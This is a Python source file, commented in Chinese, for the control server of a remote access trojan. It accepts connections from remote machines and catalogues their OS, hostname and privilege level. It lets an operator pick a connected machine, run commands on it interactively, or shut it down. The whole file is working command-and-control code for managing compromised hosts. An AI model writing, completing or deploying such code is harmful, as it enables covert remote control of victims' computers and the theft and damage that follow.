import json
import socket
import subprocess
import sys
import threading
import time

from core.protocol.ratsocket import RATSocket
from core.utils.logger import logger
from core.utils.common_util import parse, print_table
from server.commands.alias_manager import AliasManager
from server.commands.executor import CommandExecutor
from server.config.config import SOCKET_ADDR
from core.utils.server_util import *
from server.connection.client_connection import ClientConnection
from server.connection.connection_manager import ConnectionManager


class Server:
    def __init__(self, address):
        """
        初始化服务器对象
        :param address: 服务器地址
        """
        self.address = address
        self.socket = RATSocket()
        self.connections = ConnectionManager()
        self.alias_manager = AliasManager()

    # ------------------ 连接建立 ------------------ #
    def _bind_server_socket(self):
        """
        绑定并启动监听
        """
        self.socket.bind(self.address)
        logger.info('Listening on port {}'.format(self.address[1]))

    def _receive_client_info(self, conn):
        """
        接收客户端初始信息
        """
        conn.settimeout(5)
        try:
            connection = ClientConnection(conn)
            return connection.recv()
        finally:
            conn.settimeout(None)

    def _build_connection_info(self, addr, info: dict) -> dict:
        """
        构造客户端连接信息
        """
        return {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}

    def _register_connection(self, conn, addr, info: dict) -> ClientConnection:
        """
        创建并注册客户端连接对象
        """
        connection = ClientConnection(conn, addr, info)
        self.connections.add(connection)
        logger.info('Connection has been established: {}'.format(addr))
        return connection

    def _accept_connection(self):
        """
        接受一个新连接并完成初始化
        """
        conn, addr = self.socket.accept()

        try:
            info = self._receive_client_info(conn)
        except json.JSONDecodeError:
            conn.close()
            logger.error('Connection timed out: {}'.format(addr))
            return None
        except Exception as e:
            conn.close()
            logger.error('Error establishing connection: {}'.format(e))
            return None

        info = self._build_connection_info(addr, info)
        return self._register_connection(conn, addr, info)

    def _start_connection_handler(self, connection):
        """
        启动客户端连接接收线程
        """
        threading.Thread(
            target=self.connection_handler,
            args=(connection,),
            daemon=True
        ).start()

    def serve(self):
        """
        接受新连接的线程
        """
        try:
            self._bind_server_socket()
        except Exception as e:
            logger.error('Error binding socket: {}'.format(e))
            return

        while 1:
            try:
                connection = self._accept_connection()
                if connection is None:
                    continue
                self._start_connection_handler(connection)
            except socket.error as e:
                logger.error(e)

    # ------------------ 连接生命周期 ------------------ #
    def _notify_connection_closed(self, conn: ClientConnection):
        """
        通知等待中的主线程：该连接已关闭
        """
        conn.message_queue.put(0, None, 1)

    def _remove_connection(self, conn: ClientConnection):
        """
        从连接管理器中移除连接
        """
        self.connections.remove(conn)

    def _handle_connection_closed(self, conn: ClientConnection):
        """
        处理连接关闭后的清理逻辑
        """
        logger.error(f'Connection closed: {conn.address}')
        self._notify_connection_closed(conn)
        self._remove_connection(conn)

    def _handle_connection_receive_error(self, conn: ClientConnection):
        """
        处理接收线程中的非致命异常
        """
        logger.error(f'Error receiving from {conn.address}', exc_info=True)
        time.sleep(1)

    # ------------------ 子线程接收 ------------------ #
    def connection_handler(self, conn):
        """
        处理接收的子线程
        :param conn: 连接
        """
        while 1:
            try:
                conn.recv_message()
            except socket.error:
                self._handle_connection_closed(conn)
                break
            except Exception:
                self._handle_connection_receive_error(conn)

    # ------------------ 连接查询 ------------------ #
    def list_connections(self):
        """
        显示连接列表
        """
        connection_list = self.connections.all()
        if not connection_list:
            print("No active connections at present")
            return

        headers = ['ID', 'Address', 'OS', 'OS Version', 'Hostname', 'Integrity']
        data = [
            [
                str(i),
                conn.info.get('addr', 'N/A'),
                conn.info.get('os_type', 'Unknown'),
                conn.info.get('os_ver', 'Unknown'),
                conn.info.get('hostname', 'Unknown'),
                conn.info.get('integrity', '?')
            ]
            for i, conn in enumerate(connection_list)
        ]
        print_table(headers, data)

    def get_last_connection(self) -> ClientConnection:
        """
        获取最新连接
        :return: 连接
        """
        try:
            return self.connections.last()
        except IndexError:
            raise Exception('No connection at this time')

    def get_target_connection(self, id) -> ClientConnection:
        """
        根据id获取连接
        :param id: 连接id
        :return: 连接
        """
        try:
            return self.connections[int(id)]
        except (ValueError, IndexError):
            raise Exception('Not a valid selection')

    def kill_connection(self, id):
        """
        关闭连接
        :param id: 连接id
        """
        conn = self.get_target_connection(id)
        if conn:
            conn.send_command('kill')

    # ------------------ 交互会话 ------------------ #
    def _print_unread_messages(self, conn: ClientConnection):
        """
        输出连接的未读消息
        """
        while not conn.message_queue.empty():
            logger.info('[UNREAD] ' + str(conn.message_queue.get()[1]))

    def _handle_interactive_control_command(self, conn: ClientConnection, cmd: str) -> bool:
        """
        处理交互模式下的控制命令
        :return: True 表示已处理且应结束当前轮询
        """
        if cmd in ['kill', 'reset']:
            conn.send_command(cmd)
            return True

        if cmd in ['exit', 'quit']:
            return True

        if cmd == 'q':
            connection = self.get_last_connection()
            if connection == conn:
                return False
            self.open_connection(connection)
            return True

        return False

    def _execute_interactive_command(self, conn: ClientConnection, command_executor: CommandExecutor, cmd: str):
        """
        执行交互模式命令
        """
        func = command_executor.process_command(cmd)
        if func:
            for item in func():
                write(*item)

    def open_connection(self, conn: ClientConnection):
        """
        与连接交互
        :param conn: 连接
        """
        print('[+] Connected to {}'.format(conn.address))
        conn.is_interactive = True
        self._print_unread_messages(conn)

        command_executor = CommandExecutor(conn, self)
        try:
            while 1:
                try:
                    cmd = colored_input('{}> '.format(conn.info['cwd']))
                    if not cmd.strip():
                        continue

                    if self._handle_interactive_control_command(conn, cmd):
                        break

                    self._execute_interactive_command(conn, command_executor, cmd)
                except Exception as e:
                    print_error(f'{e.__class__.__name__}: {e}')
        except socket.error:
            print_error('[-] Connection closed')
        except KeyboardInterrupt:
            print(Colors.RESET)
            time.sleep(0.1)
        except Exception as e:
            print_error(f'{e.__class__.__name__}: {e}')
        finally:
            conn.is_interactive = False

    # ------------------ 主控台命令 ------------------ #
    def _handle_console_command(self, cmd: str):
        """
        处理主控台命令
        """
        name, arg = parse(cmd)

        if cmd in ['l', 'ls', 'list']:
            self.list_connections()
            return

        if cmd == 'q':
            self.open_connection(self.get_last_connection())
            return

        if name in ['s', 'select']:
            self.open_connection(self.get_target_connection(arg))
            return

        if name in ['k', 'kill']:
            self.kill_connection(arg)
            return

        if cmd in ['quit', 'exit']:
            self.socket.close()
            sys.exit(0)

        if cmd in ['cls', 'clear']:
            subprocess.call(cmd, shell=True)
            return

        if name == 'cd':
            print(cd(arg))
            return

        try:
            self.open_connection(self.get_target_connection(cmd))
        except Exception:
            raise Exception('Command not recognized')

    def cmdloop(self):
        """
        命令行交互
        """
        while 1:
            try:
                cmd = colored_input('flc> ')
                if not cmd.strip():
                    continue
                self._handle_console_command(cmd)
            except KeyboardInterrupt:
                print(Colors.RESET)
                self.socket.close()
                sys.exit(0)
            except Exception as e:
                write(0, f'[-] {type(e).__name__}: {e}')
            finally:
                print()


if __name__ == '__main__':
    os.system('')  # 初始化颜色显示
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, daemon=True).start()
    server.cmdloop()